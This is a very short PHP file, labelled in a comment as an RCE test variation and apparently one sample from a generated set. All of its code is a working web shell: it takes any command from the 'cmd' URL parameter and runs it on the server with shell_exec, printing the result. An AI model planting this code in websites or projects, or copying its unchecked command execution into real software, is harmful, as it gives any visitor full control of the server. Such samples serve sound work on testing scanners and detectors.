<?php
// RCE test variation #1357
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>